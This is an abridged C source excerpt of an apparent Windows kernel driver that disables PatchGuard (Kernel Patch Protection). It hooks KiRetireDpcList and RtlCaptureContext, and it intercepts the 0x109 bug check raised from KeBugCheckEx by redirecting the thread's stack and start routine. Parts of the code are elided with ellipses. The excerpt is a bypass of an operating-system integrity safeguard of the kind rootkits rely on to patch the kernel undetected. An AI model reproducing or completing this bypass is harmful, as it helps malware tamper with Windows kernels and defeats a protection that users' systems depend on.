...
extern VOID AdjustStackCallPointer(IN ULONG_PTR NewStackPointer,
                                   IN PVOID StartAddress, IN PVOID Argument);
...
//真心刁！
VOID PgTempDpc(IN struct _KDPC *Dpc, IN PVOID DeferredContext,
...
VOID OnRtlCaptureContext(PHOOK_CTX hookCtx) {
  ...
  if (Rcx == 0x109) {
    ...
    if (Rip >= g_KeBugCheckExAddress && Rip <= g_KeBugCheckExAddress + 0x64) {
      ...
      PVOID StartRoutine =
          *(PVOID **)(CurrentThread + g_ThreadContextRoutineOffset);
      PVOID StackPointer = IoGetInitialStack();
      CHAR Cpu = GetCpuIndex();
      KeInitializeDpc(&g_TempDpc[Cpu], PgTempDpc, NULL);
      ...
      if (1) {
        ...
        *(ULONG64 *)StackPage = (((ULONG_PTR)StackPage + 0x1000) &
                                 0x0FFFFFFFFFFFFF000); // stack起始的MagicCode，
...
VOID DisablePatchProtectionSystemThreadRoutine(IN PVOID Nothing) {
  ...
  for (g_ThreadContextRoutineOffset = 0; g_ThreadContextRoutineOffset < 0x1000;
       g_ThreadContextRoutineOffset += 4) {
    if (*(PVOID **)(CurrentThread + g_ThreadContextRoutineOffset) ==
        (PVOID)DisablePatchProtectionSystemThreadRoutine)
      break;
  }
  ...
  if (g_ThreadContextRoutineOffset < 0x1000) {
    ...
    g_CpuContextAddress =
        (ULONG64)ExAllocatePool(NonPagedPool, 0x200 * g_MaxCpu + 0x1000);
    ...
    pslp_head_n_byte =
        HookKernelApi(KiRetireDpcList, (PVOID)HookKiRetireDpcList, &ori_pslp,
                      &pslp_patch_size);

    g_KiRetireDpcList = ori_pslp;

    pslp_head_n_byte1 = HookKernelApi(
        (ULONG_PTR)fc_DbgkGetAdrress(L"RtlCaptureContext"),
        (PVOID)HookRtlCaptureContext, &ori_pslp1, &pslp_patch_size1);
  }
}
...
NTSTATUS DisablePatchProtection() {
  ...
  Status = PsCreateSystemThread(
      &ThreadHandle, THREAD_ALL_ACCESS, &Attributes, NULL, NULL,
      DisablePatchProtectionSystemThreadRoutine, NULL);
...
VOID InitDisablePatchGuard() { DisablePatchProtection(); }
VOID UnLoadDisablePatchGuard() {

  UnhookKernelApi((ULONG_PTR)fc_DbgkGetAdrress(L"RtlCaptureContext"),
                  pslp_head_n_byte1, pslp_patch_size1);
